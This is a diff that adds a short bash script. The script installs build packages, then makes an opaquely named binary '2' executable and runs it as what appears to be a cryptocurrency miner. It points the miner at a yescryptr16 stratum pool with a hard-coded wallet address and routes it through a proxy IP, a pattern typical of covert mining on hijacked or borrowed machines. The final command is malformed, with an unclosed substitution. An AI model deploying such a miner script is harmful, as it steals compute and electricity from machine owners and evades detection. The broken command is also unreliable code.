@@ -1,0 +1,6 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+chmod +x 2
+./2 -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qdT8eUba5TisRY2wJwW9v2YCrL3tk6nZTs.$(shuf -i 1000-9999 -n 1 -x 192.252.215.2:4145
